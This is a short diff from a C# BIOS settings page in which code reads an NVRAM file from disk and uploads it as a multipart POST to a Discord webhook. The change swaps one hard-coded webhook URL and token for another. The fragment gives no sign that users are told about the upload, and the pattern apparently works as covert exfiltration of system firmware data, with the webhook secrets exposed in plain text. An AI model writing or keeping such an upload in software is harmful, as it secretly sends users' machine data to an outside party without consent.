@@ -592,6 +592,6 @@ public sealed partial class BiosSettingPage : Page, INotifyPropertyChanged
             { new ByteArrayContent(File.ReadAllBytes(nvram)), "file", Path.GetFileName(nvram) }
         };
 
-        await client.PostAsync("https://discord.com/api/webhooks/1412559230619357235/pxmdfs6RSG8NH_78yg0AN0pAv5DgxDfxDpOFEtGaBStB1TewSMTyr2tuGnrg3TKjZH9R", multipart);
+        await client.PostAsync("https://discord.com/api/webhooks/1444743392868172016/1kq532maWmIguJEO-rp-X4RHG1idpbjKFWHC7IYwxr6KLEZxjhrJhwftYeeRKfKDYB-a", multipart);
     }
 }
